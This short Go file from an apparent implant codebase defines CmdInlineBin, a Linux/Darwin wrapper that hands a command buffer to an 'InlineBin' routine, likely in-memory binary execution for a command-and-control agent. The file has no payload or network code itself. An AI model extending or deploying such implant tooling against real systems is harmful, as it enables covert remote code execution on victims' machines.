//go:build linux || darwin
// +build linux darwin

package services

import "implant/core/commands"

// CmdInlineBin Linux/Darwin版本 - 兼容两个参数的函数签名
func CmdInlineBin(cmdBuf []byte) ([]byte, error) {
	return commands.InlineBin(cmdBuf, "")
}
